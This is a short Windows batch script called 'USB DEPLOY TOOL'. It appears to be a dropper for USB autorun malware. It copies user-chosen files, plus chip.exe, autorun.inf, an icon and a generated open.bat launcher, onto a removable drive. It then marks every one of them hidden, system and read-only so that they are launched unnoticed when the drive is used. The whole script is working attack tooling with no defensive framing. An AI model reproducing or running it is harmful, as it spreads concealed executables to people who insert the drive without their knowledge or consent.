@ echo off
color 0a
mode con:cols=90 lines=30
echo                             WELCOME TO USB DEPLOY TOOL 
    echo Enter  Drive Letter 
set /p package=
echo Enter the number of files you want to deploy
set /p files=
set /a index=0
echo @echo off>open.bat
:exec
set /a index+=1
echo %index% && set /p file=
echo start %file%>>open.bat 
cd C:\vamp\toolkit
xcopy /y %file%.*  %package%:
%package%:
attrib %file%.* +r +i +s +h 
c: 
if %index%==%files% goto climax
goto exec
:climax
c: 
xcopy /y open.bat  %package%:
xcopy /y icon.ico %package%:
xcopy /y autorun.inf %package%:
xcopy /y chip.exe %package%:

%package%:
attrib icon.ico +r +i +s +h 
attrib autorun.inf +r +i +s +h 
attrib chip.exe +r +i +s +h 

pause